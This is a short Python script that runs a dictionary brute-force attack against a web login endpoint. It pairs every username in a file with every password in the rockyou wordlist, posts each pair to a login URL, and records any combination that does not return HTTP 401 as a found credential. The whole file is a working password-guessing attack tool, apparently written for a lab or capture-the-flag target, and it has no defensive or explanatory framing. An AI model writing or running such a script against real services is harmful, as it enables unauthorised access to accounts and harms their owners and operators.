import requests
from tqdm import tqdm

users = open("users.txt").read().splitlines()
passwords = open("/usr/share/wordlists/rockyou.txt", errors="ignore").read().splitlines()

total = len(users) * len(passwords)

with open("found.txt", "a") as found_file:
    with tqdm(total=total, unit="attempt") as pbar:
        for user in users:
            for pw in passwords:
                r = requests.post("http://interface/login",
                    json={"username": user, "password": pw},
                    timeout=5)
                if r.status_code != 401:
                    result = f"{user}:{pw} -> HTTP {r.status_code}"
                    tqdm.write(f"[+] {result}")
                    found_file.write(result + "\n")
                    found_file.flush()
                pbar.update(1)
